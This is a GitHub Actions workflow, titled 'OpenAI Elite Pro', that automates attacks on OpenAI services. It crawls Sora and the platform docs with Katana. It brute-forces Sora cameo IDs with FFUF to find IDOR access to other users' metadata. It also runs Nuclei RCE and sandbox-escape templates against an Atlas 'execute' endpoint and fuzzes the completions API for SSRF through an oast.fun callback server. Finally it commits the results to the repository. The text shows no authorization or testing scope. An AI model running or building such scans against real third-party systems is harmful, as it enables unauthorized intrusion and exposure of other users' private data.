name: "OpenAI Elite Pro ‚Äî SORA & ATLAS"

on:
  workflow_dispatch:

permissions:
  contents: write
  issues: write

env:
  # Base targets for the newest products
  SORA_API: "https://sora.openai.com/api/v1"
  ATLAS_API: "https://api.openai.com/v1/atlas"

jobs:
  pro_exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Professional Arsenal (2026)
        run: |
          # The Big Three: Nuclei, FFUF, and Katana
          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          go install github.com/projectdiscovery/katana/cmd/katana@latest
          go install github.com/ffuf/ffuf/v2@latest
          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH

      - name: üó∫Ô∏è Phase 1:Deep Discovery (Katana)
        run: |
          # Deep crawl Sora and Atlas documentation to find hidden JSON endpoints
          katana -u "https://sora.openai.com" -jc -d 3 -o sora_endpoints.txt
          katana -u "https://platform.openai.com/docs" -jc -d 3 -o api_endpoints.txt

      - name: üé• Phase 2:Sora Privacy Breach (FFUF)
        run: |
          # Testing for IDOR on Cameos and Drafts
          # We check if changing the ID returns a 200 (Success) instead of 403 (Forbidden)
          seq 1000 2000 > ids.txt
          ffuf -u "${{ env.SORA_API }}/cameo/FUZZ/metadata" \
               -w ids.txt \
               -H "Authorization: Bearer ${{ secrets.SORA_TOKEN }}" \
               -mc 200 -o sora_idor_hits.json || true

      - name: üõ°Ô∏è Phase 3:Atlas Agent Hijack (Nuclei)
        run: |
          # Using active CVE templates for Sandbox Escapes and Origin Bypasses
          # We specifically target the Atlas 'navigate' and 'execute' commands
          nuclei -u "${{ env.ATLAS_API }}/execute" \
            -tags cve2025,cve2026,rce,sandbox-escape \
            -H "Authorization: Bearer ${{ secrets.OPENAI_API_KEY }}" \
            -o atlas_vulnerabilities.txt || true

      - name: ‚ò¢Ô∏è Phase 4:Active CVE Fuzzing (Core API)
        run: |
          # Fuzzing the core API for SSRF and Header Injection
          nuclei -u "https://api.openai.com/v1/completions" \
            -t http/fuzzing/ \
            -H "Authorization: Bearer ${{ secrets.OPENAI_API_KEY }}" \
            -interactsh-server oast.fun \
            -o core_api_fuzz.txt || true

      - name: üö® Analysis & Persistence
        if: always()
        run: |
          if [ -s sora_idor_hits.json ] || [ -s atlas_vulnerabilities.txt ]; then
            TITLE="üö® CRITICAL: OpenAI Frontier Finding"
            REPORT="Potential Bug Found:\n$(cat sora_idor_hits.json atlas_vulnerabilities.txt | head -n 20)"
            
            curl -X POST -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
              -H "Content-Type: application/json" \
              https://api.github.com/repos/${{ github.repository }}/issues \
              -d "{\"title\":\"$TITLE\",\"body\":\"$REPORT\"}"
          fi
          
          # Save intelligence to repo
          git config --local user.email "bot@hacker.ai"
          git config --local user.name "Exploit-Bot"
          git add .
          git commit -m "Frontier Intel Update: Sora/Atlas/API" || true
          git push origin main || true
          
